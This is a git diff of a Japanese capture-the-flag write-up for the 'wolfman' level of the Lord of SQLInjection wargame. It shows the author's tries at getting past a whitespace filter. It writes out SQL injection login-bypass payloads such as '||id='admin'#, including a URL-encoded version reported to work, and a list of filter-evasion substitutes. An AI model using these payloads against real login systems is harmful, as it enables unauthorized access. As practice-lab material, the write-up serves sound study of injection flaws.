@@ -29,39 +29,61 @@ query : select id from prob_wolfman where id='guest' and pw=''
 試しに、
 
 ```
-https://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw=aa
+https://los.eagle-jump.org/wolfman_f14e72f8d97e3cb7b8fe02bef1590757.php?pw=aaa
 ```
 
 とすると
 
 ```
-query : select id from prob_orc where id='admin' and pw='aa'
+query : select id from prob_wolfman where id='guest' and pw='aaa'
 ```
 
 となった。
+
 コードを読んでいく。
 
 ```
 if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~");
 ```
 
-待ってました！whitespaceフィルター！
+whitespaceフィルターだ。
+半角スペースはタブ文字`\t`か`\**\`で回避するのがセオリーなのはたまたま知っていた（やったことない）ので、
+さっそくためしてみる。
 
+```
+?pw='\tor\tid='admin'#
 ```
 
 ```
+?pw='\**\or\**\id='admin'#  
+```
 
-今回はたまたま瞬殺でした。
+上手くいかんな、、、
 
+orの代わりに||を使ってみる作戦でいくか
+
+```
+?pw='||id='admin'#
+```
+
+行けない。
+
+url encodeしてみる。
+
+```
+?pw='%7C%7Cid%3D'admin'%23
+```
+
+できた。
+
+原因は`#`をurl encodeするかどうかだった。
 
 ## supplementary
 
 いろんな文字がフィルターされたときの代替文字（CTF界伝説のサイト、[こちら](https://graneed.hatenablog.com/entry/2018/10/26/232304)を参照）
 
 - ' : "
-- 半角スペース : タブ文字
 - = : STRCMPとis not TRUE
-- or : ||
 - admin : "admi" "n" を文字列結合
 
 ## references
